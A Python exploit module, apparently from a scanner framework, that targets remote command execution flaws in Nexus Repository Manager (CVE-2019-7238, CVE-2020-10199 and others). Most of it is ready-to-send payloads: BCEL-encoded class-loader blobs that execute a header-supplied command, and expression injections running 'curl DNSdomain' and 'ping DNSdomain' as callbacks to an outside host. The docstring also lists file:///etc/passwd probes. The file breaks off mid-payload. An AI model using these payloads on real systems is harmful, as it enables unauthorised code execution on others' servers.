#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Nexus Repository Manager 3 是一款软件仓库, 可以用来存储和分发Maven、NuGET等软件源仓库
    Nexus扫描类: 
        1. Nexus Repository Manager 3 远程命令执行
            CVE-2019-7238
                Payload: https://vulhub.org/#/environments/nexus/CVE-2019-7238/
            
        2. Nexus Repository Manager 3 远程命令执行
            CVE-2020-10199
                Payload: https://vulhub.org/#/environments/nexus/CVE-2020-10199/
                         https://github.com/aleenzz/CVE-2020-10199

        3. Nexus Repository Manager 3 远程命令执行
            CVE-2020-10204
                Payload: https://vulhub.org/#/environments/nexus/CVE-2020-10204/
                         https://github.com/aleenzz/CVE-2020-10199

        4. Nexus Repository Manager 2 yum插件 远程命令执行
            CVE-2019-5475
                Payload: https://gitee.com/delete_user/CVE-2019-5475#0x60-cve-2019-15588%E9%9D%B6%E5%9C%BA%E9%AA%8C%E8%AF%81
                         https://cloud.tencent.com/developer/article/1655524

        5. Nexus Repository Manager 2 yum插件 二次远程命令执行
            CVE-2019-15588
                Payload: https://gitee.com/delete_user/CVE-2019-5475#0x60-cve-2019-15588%E9%9D%B6%E5%9C%BA%E9%AA%8C%E8%AF%81
                         https://cloud.tencent.com/developer/article/1655524

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
from time import sleep
import re

class Nexus():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Nexus-Repository'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        # ! --------------------------------------------------cve_2019_7238_payloads

        self.cve_2019_7238_payloads = [
            {
                'path': 'service/extdirect',
                'data': '''{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":50,"sort":[{"property":"name","direction":"ASC"}],"filter":[{"property":"repositoryName","value":"*"},{"property":"expression","value":"' '.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$eb$7f$UW$Z$7eN$b2$d9$99L$s$9bd6$9bd$A$xH$80M$80$5dJ$81$96$e5bC$K$e5$S$u$924$YR$ad$93eH$W6$3b$db$d9$d9$Q$d0j$d1Z$ea$adVQ$yj$d1R5$de5$a2$h$q$82h$V$b5$9f$fc$ea7$3f$f6$_$e0$83$3f$7f$8d$cf$99$dd$N$d9d$5b$fc$R$ce$ceyo$e7y$df$f3$3e$ef$cc$db$ef$de$bc$N$60$L$fe$a1$n$IGAVC$N$9cz$$$cfI$89$ab$m$a7$e2i$Nm$f04$e41$n$97$b3$w$s$a5$e4$9c$8a$f3$K$86U$7cR$c5$a74t$e0y$v$fd$b4$8a$cfhX$81$XT$5cP$f0Y$v$fa$9c$82$X5$7c$k$_$a9$b8$a8$e2e$F_P$f1E$V_R$f1e$F_Q$f1$8a$8a$afjx$V_$93$cb$d7$V$5cR$f0$N$N$df$c4e$Nk$f1$z$Nk$f0$9a$82$x$g$ba$e1$c8$cd$b7$e5$d3wT$7cW$fe$be$aea$r$ae$ca$e5$7b$K$be$af$e0$N$81$a07$e6$da$d6I$B$a3$ef$b45a$c5$d3Vf4$3e$e0$cbvP$bb3$95Iy$bb$Fj$a3$5d$83$C$81$5e$e7$a4$z$d0$d4$97$ca$d8G$f2$e3$p$b6$3b$60$8d$a4m$e9$ec$q$ad$f4$a0$e5$a6$e4$be$q$Mxc$a9$9c$40C$9f$3d$91J$c7$e5$c2$88$ea$ced$ba$U3$b4$df$f3$b2$bdN$sc$t$bd$94$93$RhY$A$a17m$e5r$b4o$Y$93Fc$W$ad$d2$95$m$9f$g9MGi$b2$7f$a1$89$e2$da$cf$e5$ed$9cG$f0cL$c2v$x$bd$fa$3d7$95$Z$95$40$5c$3b$97u29$C$N$9euS$9e4$8c$U$NSN$fc$u$ad$bc$e3$be$98$b6$b5$c9qV$u$3c$5c$zNM$969$86$Xh$8e$baN$d2$f6$b1$d7$8c0f$c7$7c$cc$3d$f9S$a7l$d7$3ey$cc$87$r$f5$b9$91y$fd$82$a0E$3b$ea$D$ac$94$84G$a4$f94$T$K$8d$z$wX$d0$f1k$m$a0$Xo$d1$bf$F$c21$X$c4t$edSi$da$c4$f7$a5$ec$b4$bc$d2$d0$C$d3$c3V$96$d8$x$F$y$fc$f9$f3$C$9a$t$_$d1wbM$8b$e7$e4$W$d5$60$fe$G4$3b$e3$b9$e7$fc$xcw$f8$9bA$x$9d$_$bb$b7Uv$c7$b9l$b9CZ$X_$f8$ce$ee$dd$M$d7$d8$efY$c93$c4$e2$9b$91U$K$ae$91$V$q$I$d9$40$S$u8$a8$e0M$bf$f5$af$94$fbX$ebw$f2n$92$t$ca$b8$f5$b2$d9b2$b6$8emx$b4$q$f0$5bP$t$7f$b7$ea$f8$B$7e$u$d0$bc$b8$e3u$fc$IS$3cL$c7$8f$f1$T$j$3f$c5$cf$E$3a$a5QL$g$c5$G$ee$X$aas$a0$a2h$3a$7e$8e_$I$d4y$c5$bc$ba$ff$l$9f$ce$bd$b2Nt$9a$90$a5$d2$f1K$fcJ$c7$af1$z$b0$ceqGc6y$92$cd$d9$b1$d3$b6$e7$9d$8b$e5lw$c2vc$95$8c$d1$f1$h$5c$e7$8d$8e$da$5e$F$F$9a$WUU$c7o$f1$bb$8at$8b7$a7$a0$a0c$G7X$3d$868V$e6M$bd$8cW$a2N$f3$e2$e6$q$Z$b6l$daB$d2$f9$ke$GI$97$e3$r$S$85$abp$88$W$f1$91T$s$3eb$e5$c6$d8$f7$h$93$K$7e$af$e3$sfu$fc$B$b7$d8$n$d59$c2N$$$x$Od$b2y$8f$Qlk$bc$a8c$H$e8$b8$8d$3f$ca$h$be$p$97$3f$95$c3$y$a1$92$8e$3fcZ$c7$5b$f8$8b$80$d0t$fcU$ee$ee$e2o$3a$fe$$$9bc$e5$7d$af$D$e9$b4$3dj$a5$7b$92$92$c1$7b$t$93v$b6H$b4$f0$7d$93$F$d2$f6$f7$60$Z$t$d9$92q$c0$aeN$e6$5d$97$dc$Y$u$N$dc$d6hW$b5$91$db$ccR$3e$c1$cb$b7X$85R$b4$8d$d1$a5$83$a7$eb$7d$u$de$98$b3$bdb$K$a9$e2$m$8e$9e$90$d3$bb$96$91$F$d6F$972$b8$ab$g$a9$95S$8e$7b$c4$g$a7$ff$9a$H$9c_$9e$d5$w$P$u$N$81p$b4$9a$81B$83b$c8$ca$e4$e7$87i$90$3d$e8O$b0H5$94$t$8a$8dv$d8$f6$c6$i$96$e5$f1$w$b0$86$97$9cZ$adP$c5$I$3c$af$e3$bdt$84$92$caL8g$Iu$7b$V$uU$a6$60$d5$g$$$e8$83c$f9$8c$97$92$a9$fb$5c$xo$o$Vu$u$89$e5$e8$b7$t$ed$a4$404Z$e5$9d$d3U$f5e$p$a7$c0$C$92$b0$3b$cb$a1$x$d9$p$b3$8eVU$c8$k$J$dfW$95$5eSR$aa$fas$ab$f82$b2$b2Y$3b$c3$falx$40S$yz$97$a9$9eS$k$mu$fe$ebv$d1$j$97$p$f0$b4$bad$da$c9$d9X$c5$ef$aa$m$bf$b7X19$b3$f9T$c3g$8es$ae$8fq$X$e7$af$e0o$5d$f7$M$c4$b4$af$de$ce5$e8$LU$q$b8$eaE$D$ec$c0N_$b6$ab$ec$i$e8$a4$dd2$c6$7es$W5C3$a8$bd$8e$c0$N$d4$j2$82$86R$80$da$b7$3eP$40$fd$fa$ee$C$b4$c3F$c3$N$e8G6$g$8d$94$t$Cf$40j$cc$c0$G$aa$ee$m$c4$bfD$9d$d1D$8bD$d0$M$g$cd$d2F1$V$df$a6$$$a1$9a$ea$edm$f5$b5$db$b4$88$W$a9$bf$s$b6$9ajD$db$9ch0$h$ee$8a$d5$a6b60FB7$f5$bb$a2$d9$d4$Lh$v$c00$c2$F$b4$5e$e1$d8$93$fbD$a3$d9hDjo$a1$ad$80vS$e7CG$Bf$od$86$a4$b2$c9l2$96$95$95$a1$b2$b2$d9$q$86$Wcy$80$8a$a1ZcE$bf$d46s$d7$c1$dd$H$b83$ef$60E$a2$85$be$P$z$f15LC$fa$7e$b0$ac0J$8a$3bX$99$I$Hoa$FC$ac$ea$l$K$Y$l$ea$l$aa3$5b$fa$T$ad7$b0$dal$z$a03$R$99$c5$9a$a1Y$ac$j2$p$F$ac$9bAt$G$5d$89$b6Yt$b3$b6$eb$T$ed$s$e3m$YJt$dcE$d8l7$Zs$a3$R$e3r$7cj$ee$j$b3$bd$80x$c24$c3$a6Y$c0$s$93$f9$3f$3c$85$ba$84$fe$a2$s$a6$de$7d$7b$K$81C$d3$bc$d8IqI$5c$c6fh$e2$aax$D$8f$m$e0_$f5U$ac$e3Z$cf$fehD$IM$fcxn$c6r$84$d99m$d4t$b0CL$f6$cdr$f4$e2$n$i$e4Go$3f5CX$8d$i$3a1$c9$af$e5$L$b4z$JQ$5cF$X$5e$c7z$5c$c7$G$be$93b$f8$t6$e1$k$k$W$3a6$8b$u$k$R$bb$b0E$3c$89$ad$e2$Zl$T6$k$TYl$X$_$60$87$b8$88$5d$e2$V$ec$W$97$d0Kt$3d$e25$ac$WW$b1$9f$I$f7$89k$3cQ$b6$e0$3bhg$ec$7b$d8$8d$P$T$e5u$fc$h$8f$a3$87ho$e2_$d8CY$TO$7b$8b$I$7b$88$fd$k$z$9f$c0$5e$b4$f0$e4$8b$d8G$99$c1$f3$cf$e0I$ecG$98$u$Gq$80Q$5b$89$a5$P$87$f8$3fBD$8f$e20$8e$a0$8d$b8bx$KG$d1$$$c6$99$d9G$Y$a5$83$f8t$i$e3$93$89$L$c2$60$f6$3d$dc$e7$c4$g$M$f0$a9$B$n$f1j$89Wm$e2e$3c$cd$e8$C$ab$c4$f38Nm$N$d6$89$b3$f8$u$f1$d5$o$$$iVm$905$ef$V$c38$81a$S$ea$a0$Y$c03$d4$G$d1$_$O$e1c$d4$w$f8$b8$8cD$cfb$b6$cf2$dbb$8e$cf2$c7OP7$8d$fa9$d8hP$60$v$YQ$c0o$80$93$feCh$feA$90$aes$fc$d7$f1$be6$be$b8$a8$99_m$7f$3d$a5$60T$c1$98$82$94$82$d3$c0$7f$b1$8c$9a9$Y$d0$l$U$Q$d8$a3$e0$cc$7f$m$e6$98$j$fc$5dZ$8e$9eq$7f$aed$fe$H$c3$e0$Q$5e$fb$N$A$A').newInstance()"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":8}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest',
                    '404': self.cmd
                })
            },
            {
                'path': 'service/extdirect',
                'data': '''{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":50,"sort":[{"property":"name","direction":"ASC"}],"filter":[{"property":"repositoryName","value":"*"},{"property":"expression","value":"233.class.forName('java.lang.Runtime').getRuntime().exec('curl DNSdomain')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":8}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                })
            },
            {
                'path': 'service/extdirect',
                'data': '''{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":50,"sort":[{"property":"name","direction":"ASC"}],"filter":[{"property":"repositoryName","value":"*"},{"property":"expression","value":"233.class.forName('java.lang.Runtime').getRuntime().exec('ping -c 4 DNSdomain')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":8}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                })
            },
            {
                'path': 'service/extdirect',
                'data': '''{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":50,"sort":[{"property":"name","direction":"ASC"}],"filter":[{"property":"repositoryName","value":"*"},{"property":"expression","value":"233.class.forName('java.lang.Runtime').getRuntime().exec('ping DNSdomain')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":8}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                })
            },
        ]

        # ! --------------------------------------------------cve_2020_10199_payloads

        self.cve_2020_10199_payloads = [
            {
                'path': 'service/rest/beta/repositories/go/group',
                'data': '''{
  "name": "internal",
  "online": true,
  "storage": {
    "blobStoreName": "default",
    "strictContentTypeValidation": true
  },
  "group": {
    "memberNames": ["${' '.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$eb$7f$UW$Z$7eN$b2$d9$99L$s$9bd6$9bd$A$xH$80M$80$5dJ$81$96$e5bC$K$e5$S$u$924$YR$ad$93eH$W6$3b$db$d9$d9$Q$d0j$d1Z$ea$adVQ$yj$d1R5$de5$a2$h$q$82h$V$b5$9f$fc$ea7$3f$f6$_$e0$83$3f$7f$8d$cf$99$dd$N$d9d$5b$fc$R$ce$ceyo$e7y$df$f3$3e$ef$cc$db$ef$de$bc$N$60$L$fe$a1$n$IGAVC$N$9cz$$$cfI$89$ab$m$a7$e2i$Nm$f04$e41$n$97$b3$w$s$a5$e4$9c$8a$f3$K$86U$7cR$c5$a74t$e0y$v$fd$b4$8a$cfhX$81$XT$5cP$f0Y$v$fa$9c$82$X5$7c$k$_$a9$b8$a8$e2e$F_P$f1E$V_R$f1e$F_Q$f1$8a$8a$afjx$V_$93$cb$d7$V$5cR$f0$N$N$df$c4e$Nk$f1$z$Nk$f0$9a$82$x$g$ba$e1$c8$cd$b7$e5$d3wT$7cW$fe$be$aea$r$ae$ca$e5$7b$K$be$af$e0$N$81$a07$e6$da$d6I$B$a3$ef$b45a$c5$d3Vf4$3e$e0$cbvP$bb3$95Iy$bb$Fj$a3$5d$83$C$81$5e$e7$a4$z$d0$d4$97$ca$d8G$f2$e3$p$b6$3b$60$8d$a4m$e9$ec$q$ad$f4$a0$e5$a6$e4$be$q$Mxc$a9$9c$40C$9f$3d$91J$c7$e5$c2$88$ea$ced$ba$U3$b4$df$f3$b2$bdN$sc$t$bd$94$93$RhY$A$a17m$e5r$b4o$Y$93Fc$W$ad$d2$95$m$9f$g9MGi$b2$7f$a1$89$e2$da$cf$e5$ed$9cG$f0cL$c2v$x$bd$fa$3d7$95$Z$95$40$5c$3b$97u29$C$N$9euS$9e4$8c$U$NSN$fc$u$ad$bc$e3$be$98$b6$b5$c9qV$u$3c$5c$zNM$969$86$Xh$8e$baN$d2$f6$b1$d7$8c0f$c7$7c$cc$3d$f9S$a7l$d7$3ey$cc$87$r$f5$b9$91y$fd$82$a0E$3b$ea$D$ac$94$84G$a4$f94$T$K$8d$z$wX$d0$f1k$m$a0$Xo$d1$bf$F$c21$X$c4t$edSi$da$c4$f7$a5$ec$b4$bc$d2$d0$C$d3$c3V$96$d8$x$F$y$fc$f9$f3$C$9a$t$_$d1wbM$8b$e7$e4$W$d5$60$fe$G4$3b$e3$b9$e7$fc$xcw$f8$9bA$x$9d$_$bb$b7Uv$c7$b9l$b9CZ$X_$f8$ce$ee$dd$M$d7$d8$efY$c93$c4$e2$9b$91U$K$ae$91$V$q$I$d9$40$S$u8$a8$e0M$bf$f5$af$94$fbX$ebw$f2n$92$t$ca$b8$f5$b2$d9b2$b6$8emx$b4$q$f0$5bP$t$7f$b7$ea$f8$B$7e$u$d0$bc$b8$e3u$fc$IS$3cL$c7$8f$f1$T$j$3f$c5$cf$E$3a$a5QL$g$c5$G$ee$X$aas$a0$a2h$3a$7e$8e_$I$d4y$c5$bc$ba$ff$l$9f$ce$bd$b2Nt$9a$90$a5$d2$f1K$fcJ$c7$af1$z$b0$ceqGc6y$92$cd$d9$b1$d3$b6$e7$9d$8b$e5lw$c2vc$95$8c$d1$f1$h$5c$e7$8d$8e$da$5e$F$F$9a$WUU$c7o$f1$bb$8at$8b7$a7$a0$a0c$G7X$3d$868V$e6M$bd$8cW$a2N$f3$e2$e6$q$Z$b6l$daB$d2$f9$ke$GI$97$e3$r$S$85$abp$88$W$f1$91T$s$3eb$e5$c6$d8$f7$h$93$K$7e$af$e3$sfu$fc$B$b7$d8$n$d59$c2N$$$x$Od$b2y$8f$Qlk$bc$a8c$H$e8$b8$8d$3f$ca$h$be$p$97$3f$95$c3$y$a1$92$8e$3fcZ$c7$5b$f8$8b$80$d0t$fcU$ee$ee$e2o$3a$fe$$$9bc$e5$7d$af$D$e9$b4$3dj$a5$7b$92$92$c1$7b$t$93v$b6H$b4$f0$7d$93$F$d2$f6$f7$60$Z$t$d9$92q$c0$aeN$e6$5d$97$dc$Y$u$N$dc$d6hW$b5$91$db$ccR$3e$c1$cb$b7X$85R$b4$8d$d1$a5$83$a7$eb$7d$u$de$98$b3$bdb$K$a9$e2$m$8e$9e$90$d3$bb$96$91$F$d6F$972$b8$ab$g$a9$95S$8e$7b$c4$g$a7$ff$9a$H$9c_$9e$d5$w$P$u$N$81p$b4$9a$81B$83b$c8$ca$e4$e7$87i$90$3d$e8O$b0H5$94$t$8a$8dv$d8$f6$c6$i$96$e5$f1$w$b0$86$97$9cZ$adP$c5$I$3c$af$e3$bdt$84$92$caL8g$Iu$7b$V$uU$a6$60$d5$g$$$e8$83c$f9$8c$97$92$a9$fb$5c$xo$o$Vu$u$89$e5$e8$b7$t$ed$a4$404Z$e5$9d$d3U$f5e$p$a7$c0$C$92$b0$3b$cb$a1$x$d9$p$b3$8eVU$c8$k$J$dfW$95$5eSR$aa$fas$ab$f82$b2$b2Y$3b$c3$falx$40S$yz$97$a9$9eS$k$mu$fe$ebv$d1$j$97$p$f0$b4$bad$da$c9$d9X$c5$ef$aa$m$bf$b7X19$b3$f9T$c3g$8es$ae$8fq$X$e7$af$e0o$5d$f7$M$c4$b4$af$de$ce5$e8$LU$q$b8$eaE$D$ec$c0N_$b6$ab$ec$i$e8$a4$dd2$c6$7es$W5C3$a8$bd$8e$c0$N$d4$j2$82$86R$80$da$b7$3eP$40$fd$fa$ee$C$b4$c3F$c3$N$e8G6$g$8d$94$t$Cf$40j$cc$c0$G$aa$ee$m$c4$bfD$9d$d1D$8bD$d0$M$g$cd$d2F1$V$df$a6$$$a1$9a$ea$edm$f5$b5$db$b4$88$W$a9$bf$s$b6$9ajD$db$9ch0$h$ee$8a$d5$a6b60FB7$f5$bb$a2$d9$d4$Lh$v$c00$c2$F$b4$5e$e1$d8$93$fbD$a3$d9hDjo$a1$ad$80vS$e7CG$Bf$od$86$a4$b2$c9l2$96$95$95$a1$b2$b2$d9$q$86$Wcy$80$8a$a1ZcE$bf$d46s$d7$c1$dd$H$b83$ef$60E$a2$85$be$P$z$f15LC$fa$7e$b0$ac0J$8a$3bX$99$I$Hoa$FC$ac$ea$l$K$Y$l$ea$l$aa3$5b$fa$T$ad7$b0$dal$z$a03$R$99$c5$9a$a1Y$ac$j2$p$F$ac$9bAt$G$5d$89$b6Yt$b3$b6$eb$T$ed$s$e3m$YJt$dcE$d8l7$Zs$a3$R$e3r$7cj$ee$j$b3$bd$80x$c24$c3$a6Y$c0$s$93$f9$3f$3c$85$ba$84$fe$a2$s$a6$de$7d$7b$K$81C$d3$bc$d8IqI$5c$c6fh$e2$aax$D$8f$m$e0_$f5U$ac$e3Z$cf$fehD$IM$fcxn$c6r$84$d99m$d4t$b0CL$f6$cdr$f4$e2$n$i$e4Go$3f5CX$8d$i$3a1$c9$af$e5$L$b4z$JQ$5cF$X$5e$c7z$5c$c7$G$be$93b$f8$t6$e1$k$k$W$3a6$8b$u$k$R$bb$b0E$3c$89$ad$e2$Zl$T6$k$TYl$X$_$60$87$b8$88$5d$e2$V$ec$W$97$d0Kt$3d$e25$ac$WW$b1$9f$I$f7$89k$3cQ$b6$e0$3bhg$ec$7b$d8$8d$P$T$e5u$fc$h$8f$a3$87ho$e2_$d8CY$TO$7b$8b$I$7b$88$fd$k$z$9f$c0$5e$b4$f0$e4$8b$d8G$99$c1$f3$cf$e0I$ecG$98$u$Gq$80Q$5b$89$a5$P$87$f8$3fBD$8f$e20$8e$a0$8d$b8bx$KG$d1$$$c6$99$d9G$Y$a5$83$f8t$i$e3$93$89$L$c2$60$f6$3d$dc$e7$c4$g$M$f0$a9$B$n$f1j$89Wm$e2e$3c$cd$e8$C$ab$c4$f38Nm$N$d6$89$b3$f8$u$f1$d5$o$$$iVm$905$ef$V$c38$81a$S$ea$a0$Y$c03$d4$G$d1$_$O$e1c$d4$w$f8$b8$8cD$cfb$b6$cf2$dbb$8e$cf2$c7OP7$8d$fa9$d8hP$60$v$YQ$c0o$80$93$feCh$feA$90$aes$fc$d7$f1$be6$be$b8$a8$99_m$7f$3d$a5$60T$c1$98$82$94$82$d3$c0$7f$b1$8c$9a9$Y$d0$l$U$Q$d8$a3$e0$cc$7f$m$e6$98$j$fc$5dZ$8e$9eq$7f$aed$fe$H$c3$e0$Q$5e$fb$N$A$A').newInstance()}"]
  }
}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest',
                    '404': self.cmd
                })
            },
            {
                'path': 'service/rest/beta/repositories/go/group',
                'data': '''{
  "name": "internal",
  "online": true,
  "storage": {
    "blobStoreName": "default",
    "strictContentTypeValidation": true
  },
  "group": {
    "memberNames": ["$\\\\C{' '.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$eb$7f$UW$Z$7eN$b2$d9$99L$s$9bd6$9bd$A$xH$80M$80$5dJ$81$96$e5bC$K$e5$S$u$924$YR$ad$93eH$W6$3b$db$d9$d9$Q$d0j$d1Z$ea$adVQ$yj$d1R5$de5$a2$h$q$82h$V$b5$9f$fc$ea7$3f$f6$_$e0$83$3f$7f$8d$cf$99$dd$N$d9d$5b$fc$R$ce$ceyo$e7y$df$f3$3e$ef$cc$db$ef$de$bc$N$60$L$fe$a1$n$IGAVC$N$9cz$$$cfI$89$ab$m$a7$e2i$Nm$f04$e41$n$97$b3$w$s$a5$e4$9c$8a$f3$K$86U$7cR$c5$a74t$e0y$v$fd$b4$8a$cfhX$81$XT$5cP$f0Y$v$fa$9c$82$X5$7c$k$_$a9$b8$a8$e2e$F_P$f1E$V_R$f1e$F_Q$f1$8a$8a$afjx$V_$93$cb$d7$V$5cR$f0$N$N$df$c4e$Nk$f1$z$Nk$f0$9a$82$x$g$ba$e1$c8$cd$b7$e5$d3wT$7cW$fe$be$aea$r$ae$ca$e5$7b$K$be$af$e0$N$81$a07$e6$da$d6I$B$a3$ef$b45a$c5$d3Vf4$3e$e0$cbvP$bb3$95Iy$bb$Fj$a3$5d$83$C$81$5e$e7$a4$z$d0$d4$97$ca$d8G$f2$e3$p$b6$3b$60$8d$a4m$e9$ec$q$ad$f4$a0$e5$a6$e4$be$q$Mxc$a9$9c$40C$9f$3d$91J$c7$e5$c2$88$ea$ced$ba$U3$b4$df$f3$b2$bdN$sc$t$bd$94$93$RhY$A$a17m$e5r$b4o$Y$93Fc$W$ad$d2$95$m$9f$g9MGi$b2$7f$a1$89$e2$da$cf$e5$ed$9cG$f0cL$c2v$x$bd$fa$3d7$95$Z$95$40$5c$3b$97u29$C$N$9euS$9e4$8c$U$NSN$fc$u$ad$bc$e3$be$98$b6$b5$c9qV$u$3c$5c$zNM$969$86$Xh$8e$baN$d2$f6$b1$d7$8c0f$c7$7c$cc$3d$f9S$a7l$d7$3ey$cc$87$r$f5$b9$91y$fd$82$a0E$3b$ea$D$ac$94$84G$a4$f94$T$K$8d$z$wX$d0$f1k$m$a0$Xo$d1$bf$F$c21$X$c4t$edSi$da$c4$f7$a5$ec$b4$bc$d2$d0$C$d3$c3V$96$d8$x$F$y$fc$f9$f3$C$9a$t$_$d1wbM$8b$e7$e4$W$d5$60$fe$G4$3b$e3$b9$e7$fc$xcw$f8$9bA$x$9d$_$bb$b7Uv$c7$b9l$b9CZ$X_$f8$ce$ee$dd$M$d7$d8$efY$c93$c4$e2$9b$91U$K$ae$91$V$q$I$d9$40$S$u8$a8$e0M$bf$f5$af$94$fbX$ebw$f2n$92$t$ca$b8$f5$b2$d9b2$b6$8emx$b4$q$f0$5bP$t$7f$b7$ea$f8$B$7e$u$d0$bc$b8$e3u$fc$IS$3cL$c7$8f$f1$T$j$3f$c5$cf$E$3a$a5QL$g$c5$G$ee$X$aas$a0$a2h$3a$7e$8e_$I$d4y$c5$bc$ba$ff$l$9f$ce$bd$b2Nt$9a$90$a5$d2$f1K$fcJ$c7$af1$z$b0$ceqGc6y$92$cd$d9$b1$d3$b6$e7$9d$8b$e5lw$c2vc$95$8c$d1$f1$h$5c$e7$8d$8e$da$5e$F$F$9a$WUU$c7o$f1$bb$8at$8b7$a7$a0$a0c$G7X$3d$868V$e6M$bd$8cW$a2N$f3$e2$e6$q$Z$b6l$daB$d2$f9$ke$GI$97$e3$r$S$85$abp$88$W$f1$91T$s$3eb$e5$c6$d8$f7$h$93$K$7e$af$e3$sfu$fc$B$b7$d8$n$d59$c2N$$$x$Od$b2y$8f$Qlk$bc$a8c$H$e8$b8$8d$3f$ca$h$be$p$97$3f$95$c3$y$a1$92$8e$3fcZ$c7$5b$f8$8b$80$d0t$fcU$ee$ee$e2o$3a$fe$$$9bc$e5$7d$af$D$e9$b4$3dj$a5$7b$92$92$c1$7b$t$93v$b6H$b4$f0$7d$93$F$d2$f6$f7$60$Z$t$d9$92q$c0$aeN$e6$5d$97$dc$Y$u$N$dc$d6hW$b5$91$db$ccR$3e$c1$cb$b7X$85R$b4$8d$d1$a5$83$a7$eb$7d$u$de$98$b3$bdb$K$a9$e2$m$8e$9e$90$d3$bb$96$91$F$d6F$972$b8$ab$g$a9$95S$8e$7b$c4$g$a7$ff$9a$H$9c_$9e$d5$w$P$u$N$81p$b4$9a$81B$83b$c8$ca$e4$e7$87i$90$3d$e8O$b0H5$94$t$8a$8dv$d8$f6$c6$i$96$e5$f1$w$b0$86$97$9cZ$adP$c5$I$3c$af$e3$bdt$84$92$caL8g$Iu$7b$V$uU$a6$60$d5$g$$$e8$83c$f9$8c$97$92$a9$fb$5c$xo$o$Vu$u$89$e5$e8$b7$t$ed$a4$404Z$e5$9d$d3U$f5e$p$a7$c0$C$92$b0$3b$cb$a1$x$d9$p$b3$8eVU$c8$k$J$dfW$95$5eSR$aa$fas$ab$f82$b2$b2Y$3b$c3$falx$40S$yz$97$a9$9eS$k$mu$fe$ebv$d1$j$97$p$f0$b4$bad$da$c9$d9X$c5$ef$aa$m$bf$b7X19$b3$f9T$c3g$8es$ae$8fq$X$e7$af$e0o$5d$f7$M$c4$b4$af$de$ce5$e8$LU$q$b8$eaE$D$ec$c0N_$b6$ab$ec$i$e8$a4$dd2$c6$7es$W5C3$a8$bd$8e$c0$N$d4$j2$82$86R$80$da$b7$3eP$40$fd$fa$ee$C$b4$c3F$c3$N$e8G6$g$8d$94$t$Cf$40j$cc$c0$G$aa$ee$m$c4$bfD$9d$d1D$8bD$d0$M$g$cd$d2F1$V$df$a6$$$a1$9a$ea$edm$f5$b5$db$b4$88$W$a9$bf$s$b6$9ajD$db$9ch0$h$ee$8a$d5$a6b60FB7$f5$bb$a2$d9$d4$Lh$v$c00$c2$F$b4$5e$e1$d8$93$fbD$a3$d9hDjo$a1$ad$80vS$e7CG$Bf$od$86$a4$b2$c9l2$96$95$95$a1$b2$b2$d9$q$86$Wcy$80$8a$a1ZcE$bf$d46s$d7$c1$dd$H$b83$ef$60E$a2$85$be$P$z$f15LC$fa$7e$b0$ac0J$8a$3bX$99$I$Hoa$FC$ac$ea$l$K$Y$l$ea$l$aa3$5b$fa$T$ad7$b0$dal$z$a03$R$99$c5$9a$a1Y$ac$j2$p$F$ac$9bAt$G$5d$89$b6Yt$b3$b6$eb$T$ed$s$e3m$YJt$dcE$d8l7$Zs$a3$R$e3r$7cj$ee$j$b3$bd$80x$c24$c3$a6Y$c0$s$93$f9$3f$3c$85$ba$84$fe$a2$s$a6$de$7d$7b$K$81C$d3$bc$d8IqI$5c$c6fh$e2$aax$D$8f$m$e0_$f5U$ac$e3Z$cf$fehD$IM$fcxn$c6r$84$d99m$d4t$b0CL$f6$cdr$f4$e2$n$i$e4Go$3f5CX$8d$i$3a1$c9$af$e5$L$b4z$JQ$5cF$X$5e$c7z$5c$c7$G$be$93b$f8$t6$e1$k$k$W$3a6$8b$u$k$R$bb$b0E$3c$89$ad$e2$Zl$T6$k$TYl$X$_$60$87$b8$88$5d$e2$V$ec$W$97$d0Kt$3d$e25$ac$WW$b1$9f$I$f7$89k$3cQ$b6$e0$3bhg$ec$7b$d8$8d$P$T$e5u$fc$h$8f$a3$87ho$e2_$d8CY$TO$7b$8b$I$7b$88$fd$k$z$9f$c0$5e$b4$f0$e4$8b$d8G$99$c1$f3$cf$e0I$ecG$98$u$Gq$80Q$5b$89$a5$P$87$f8$3fBD$8f$e20$8e$a0$8d$b8bx$KG$d1$$$c6$99$d9G$Y$a5$83$f8t$i$e3$93$89$L$c2$60$f6$3d$dc$e7$c4$g$M$f0$a9$B$n$f1j$89Wm$e2e$3c$cd$e8$C$ab$c4$f38Nm$N$d6$89$b3$f8$u$f1$d5$o$$$iVm$905$ef$V$c38$81a$S$ea$a0$Y$c03$d4$G$d1$_$O$e1c$d4$w$f8$b8$8cD$cfb$b6$cf2$dbb$8e$cf2$c7OP7$8d$fa9$d8hP$60$v$YQ$c0o$80$93$feCh$feA$90$aes$fc$d7$f1$be6$be$b8$a8$99_m$7f$3d$a5$60T$c1$98$82$94$82$d3$c0$7f$b1$